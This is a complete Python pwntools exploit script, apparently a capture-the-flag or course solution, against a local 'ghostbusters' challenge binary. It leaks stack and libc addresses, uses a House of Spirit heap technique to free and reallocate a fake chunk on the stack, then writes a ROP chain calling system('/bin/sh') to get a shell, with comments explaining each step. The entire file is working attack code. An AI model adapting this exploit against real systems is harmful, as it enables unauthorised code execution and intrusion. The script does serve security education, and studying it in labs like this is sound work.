#!/usr/bin/env python3

import pwn
import socket
import threading

# docker compose -f debug.yml up
# python3 ./solve.py
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/ghostbusters')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

pwn.context.arch = 'amd64'

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")

port = 1024
conn = pwn.remote('127.0.0.1', port)

# wait for user input (in this time, connect gdb)
pwn.pause()

# House of Spirit
# create fake chunk on heap and free it
# then we can malloc it

# we get a stack leak
conn.recvuntil(b'Operator ID: ')
stack_operator = conn.recvline()[:-1]
stack_operator = int(stack_operator, 10)
print(hex(stack_operator))

# we get a libc leak
conn.recvuntil(b'Paranormal Level: ')
libc_kill = conn.recvline()[:-1]
libc_kill = int(libc_kill, 10)
libc.address = libc_kill - libc.symbols['kill']
print(f'libc at: {hex(libc.address)}')

# if we create a new equipment we get the heap address

# update searched the id in global array and writes there
# => we need to write stack pointer into equipment_list, then we can write ropchain there and are done

# delete() has a house of spirit vulnerability.
# we can provide a pointer and that pointer gets free()'ed
# write fake chunk on stack
# => free that fake chunk
# malloc equipment => in list
# update equipment and write ropchain



# 1) write fake chunk onto stack
# there is the ghostbuster_t operator "Stantz" on the stack
# call ghostbuster-info and update profile
# name is 16 bytes
# surname is 16 bytes
# equipment has header 0x70 (prev chunk in use)
fake_header = pwn.p64(0x71)

conn.sendlineafter(b'[e]nd session\n', b'g')
conn.sendlineafter(b'update your profile? [y/n]\n', b'y')
conn.sendafter(b'Enter your new name:\n', b'\x00'*16)
conn.sendafter(b'Enter your new surname:\n', b'\x00'*7 + b'\x70' + b'\x00'*8)
# this line is required, otherwise it crashes :)
conn.sendlineafter(b'[e]nd session\n', b'a')

print(f'free pointer: {hex(stack_operator + 16)}')

# 2) free fake chunk
conn.recvuntil(b'ERROR: Invalid command')
conn.sendlineafter(b'[e]nd session\n', b'd')
equipment_pointer = stack_operator + 16
conn.sendlineafter(b'Enter equipment ID to delete:\n', str(equipment_pointer).encode())

# 3) malloc this address back as equipment
conn.sendlineafter(b'[e]nd session\n', b'a')
conn.recvuntil(b'New equipment ID: ')
new_pointer = conn.recvline()[:-1]
new_pointer = int(new_pointer, 10)
print(f'equipment malloc()ed at: {hex(new_pointer)}')

# directly write ropchain
rop = pwn.ROP(libc)
rop.call(rop.ret) 
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])

payload = b'A'*(3*8) + rop.chain()

conn.sendlineafter(b'Enter equipment name:\n', payload)

# trigger ropchain
conn.sendlineafter(b'[e]nd session\n', b'e')

# enjoy your shell
conn.interactive()
